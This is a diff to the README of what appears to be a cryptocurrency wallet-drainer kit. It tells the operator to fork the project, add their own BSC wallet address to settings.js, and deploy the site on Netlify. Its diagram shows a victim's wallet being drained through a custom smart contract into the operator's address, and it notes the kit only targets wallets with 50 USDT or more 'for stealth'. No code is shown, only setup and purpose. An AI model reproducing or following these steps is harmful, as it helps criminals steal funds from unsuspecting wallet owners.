@@ -36,11 +36,14 @@ info on how to fork https://www.youtube.com/watch?v=f5grYMXbAV0
 
 4. Add your wallet to settings.js file use bsc address make sure its on your forked one
 
+Fork ---------->  add your bsc wallet to settings.js file  ------> Go to  https://www.netlify.com/ and deploy
+
+
 !!!!!! Make sure you add your wallet to settings.js file !!!!!!!
 
 HOW IT WORKS
 
-VICTIM ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
+Wallet gets drained ----> CUSTOM SMART CONTRACT -----> YOUR BSC ADDRESS
 
 !!!!!!!!! This only will work with wallets that have 50 usdt or more for stealth !!!!!!!!!
 
